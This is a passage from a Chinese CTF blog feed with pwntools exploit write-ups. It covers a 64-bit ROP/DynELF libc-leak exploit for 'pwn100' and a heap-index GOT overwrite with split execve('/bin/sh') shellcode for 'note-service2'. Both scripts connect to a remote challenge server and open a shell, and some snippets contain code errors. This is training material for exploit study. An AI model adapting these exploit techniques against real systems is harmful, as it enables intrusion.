string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">+=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>会发现这样的exp打不通</strong></p><h3 id="0x03-寻找原因"><a href="#0x03-寻找原因" class="headerlink" title="0x03.寻找原因"></a>0x03.寻找原因</h3><p><strong>原因出在了leak函数上</strong></p><blockquote><p>puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p></blockquote><h3 id="0x04-利用puts函数的DynELF模板"><a href="#0x04-利用puts函数的DynELF模板" class="headerlink" title="0x04.利用puts函数的DynELF模板"></a>0x04.利用puts函数的DynELF模板</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  count <span class="token operator">=</span> <span class="token number">0</span>  data <span class="token operator">=</span> <span class="token string">""</span>  payload <span class="token operator">=</span> xxx  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一定要在puts前释放完输出</span>  up <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">"x"</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#一定要找到泄漏信息的字符串特征</span>      data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                           data <span class="token operator">+=</span> <span class="token string">"x00"</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      buf <span class="token operator">+=</span> c    up <span class="token operator">=</span> c  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x05-调整exp"><a href="#0x05-调整exp" class="headerlink" title="0x05.调整exp"></a>0x05.调整exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#每次读取一个字节，设置超时时间确保没有遗漏</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> up <span class="token operator">==</span><span class="token string">'\n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#上一个字符是回车且读不到其他字符，说明读完了</span>            content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token comment" spellcheck="true">#最后一个字符设置为\x00</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            content <span class="token operator">+=</span> c <span class="token comment" spellcheck="true">#输出拼接</span>            up <span class="token operator">=</span> c <span class="token comment" spellcheck="true">#保存最后一个字符</span>    content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#截取输出的一段作为返回值，提供给DynELF处理</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>要认识到32位程序和64位程序传参的区别</p></li><li><p>要学会熟练使用DynELF应对可重复泄露的漏洞</p><p>参考博客：<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">【技术分享】借助DynELF实现无libc的漏洞利用小结</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;highlight=pwn" target="_blank" rel="noopener">Linux pwn入门教程(5)——利用漏洞获取libc </a></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆指针越界&amp;堆上布置shellcode|攻防世界pwn进阶区 note-service2</title>
      <link href="/2020/03/21/shellcode/"/>
      <url>/2020/03/21/shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前CTF竞赛中，以堆为背景的pwn题已逐步成为了pwn类型题目中的主流，开始逐步接触堆题，本题涉及到在堆上布置shellcode，并利用堆指针使程序执行流得到控制。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200318115718392.jpg" alt=""></p><pre><code>Canary found：不能用溢出的方式控制程序执行NX disabled：堆栈上数据可执行PIE enabled：地址随机化开启</code></pre><h3 id="0x01-查看程序功能"><a href="#0x01-查看程序功能" class="headerlink" title="0x01.查看程序功能"></a>0x01.查看程序功能</h3><p><img src="https://img-blog.csdnimg.cn/20200318120153273.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><blockquote><p>一个简单的菜单题，add 和 del可以用，show和edit功能不可用</p></blockquote><h3 id="0x02-ida查看逻辑"><a href="#0x02-ida查看逻辑" class="headerlink" title="0x02.ida查看逻辑"></a>0x02.ida查看逻辑</h3><p><img src="https://img-blog.csdnimg.cn/2020031812100961.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318121121612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>获得以下信息：</p><ul><li><strong>堆块最大为8字节，但是我们只能写入7字节的数据</strong></li><li><strong>堆指针的下标可以越界</strong><h3 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03.利用思路"></a>0x03.利用思路</h3></li></ul><blockquote><p>（1）通过堆指针越界，把一些GOT表表项替换成堆指针<br>（2）因为NX 关闭，堆栈数据可以执行，直接在堆栈上布置shellcode<br>（3）每个堆块可以写入7个字节的数据，3个字节留作布置jmp short xxx（jmp short占两个字节，对应的机器码是\xeb，xxx对应1字节，且jmp short xxx是相对当前位置寻址），4个字节用于布置shellcode。<br>（4）要把shellcode分开布置在多个堆块上面。</p></blockquote><p>jmp short xxx 中，<strong>xxx=目标地址-当前地址-2</strong></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x00-选一段shellcode布置在堆上"><a href="#0x00-选一段shellcode布置在堆上" class="headerlink" title="0x00.选一段shellcode布置在堆上"></a>0x00.选一段shellcode布置在堆上</h3><pre><code>mov rdi, xxx   //xxx=&amp;("/bin/sh")  xor rsi,rsi   //rsi=0，实际可以是mov rsi, 0 但是mov这个命令太长了。下同。占2字节mov rax, 0x3b //rax=0x3b 占4字节xor rdx,rdx   //rdx=0 占2字节syscall //就是syscall调用execve("/bin/sh",0,0)</code></pre><p><strong>jmp short 占2个字节<br>jmp short xxx占3个字节</strong></p><h3 id="0x01-计算jmp-short指令要跳多少字节"><a href="#0x01-计算jmp-short指令要跳多少字节" class="headerlink" title="0x01.计算jmp short指令要跳多少字节"></a>0x01.计算jmp short指令要跳多少字节</h3><p><img src="https://img-blog.csdnimg.cn/20200318122408317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>从chunk0跳到chunk1，<br>==目标地址-当前地址=8+8+8+1+2=0x1B==<br>==xxx=0x1B-2=0x19==<br>即从当前chunk的jmp区跳到下一个chunk的data区，距离是0x19<br><strong>jmp short 0x19转换成机器码是 \xeb\x19</strong></p><h3 id="0x02-shellcode转换为asm格式"><a href="#0x02-shellcode转换为asm格式" class="headerlink" title="0x02.shellcode转换为asm格式"></a>0x02.shellcode转换为asm格式</h3><pre><code>asm("xor rsi,rsi")+"\x90\x90\xeb\x19"asm("mov rax,0x3b")+"\xeb\x19"asm("xor rdx,rdx")+"\x90\x90\xeb\x19"asm("syscall").ljust(7,"\x90")</code></pre><p><strong>我们无法写出 asm(“mov rdi,&amp;(“/bin/sh”)”)这样的指令</strong>,<strong>即不能把”/bin/sh”的地址直接传给rdi</strong></p><h3 id="0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi"><a href="#0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi" class="headerlink" title="0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi"></a>0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi</h3><p>==由0x02知，我们不能直接把”/bin/sh”的地址给rdi==<br><strong>解决办法：</strong></p><ul><li>申请一个堆块A，把”/bin/sh”写到A上</li><li>调用free函数，把堆块A的内容（即”/bin/sh”地址）当作free函数的参数，因为第一个参数会传到rdi里面去，这样，rdi=&amp;(“/bin/sh”)</li><li>修改free函数的got表，使调用free函数之后的程序流转到我们布置shellcode的堆块上，依次执行shellcode<h3 id="0x04-计算free的got地址和堆数组静态地址的距离"><a href="#0x04-计算free的got地址和堆数组静态地址的距离" class="headerlink" title="0x04.计算free的got地址和堆数组静态地址的距离"></a>0x04.计算free的got地址和堆数组静态地址的距离</h3><img src="https://img-blog.csdnimg.cn/20200318124128459.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318125038841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>数组到free的got表的距离：<code>0x2020A0-0x202018=0x88</code><br><strong>0x88/8=17字节</strong><br><strong>即数组下标减17就来到了free的got表地址</strong></li></ul><h3 id="0x05-尝试写exp："><a href="#0x05-尝试写exp：" class="headerlink" title="0x05. 尝试写exp："></a>0x05. 尝试写exp：</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48323</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span> <span class="token operator">//</span>申请堆块写入<span class="token string">'/bin/sh'</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rsi,rsi"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span> <span class="token operator">//</span>传入<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>并改写got表add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"mov eax,0x3b"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rdx,rdx"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">//</span>系统调用<span class="token keyword">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">//</span>这一步我觉得应该是给syscall传参r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><br><a href="https://blog.csdn.net/qq_42728977/article/details/103914342" target="_blank" rel="noopener">攻防世界pwn之note-service</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/103003167" target="_blank" rel="noopener">攻防世界PWN之note-service2题解</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn</title>
      <link href="/2020/03/21/rop/"/>
      <url>/2020/03/21/rop/</url>
      
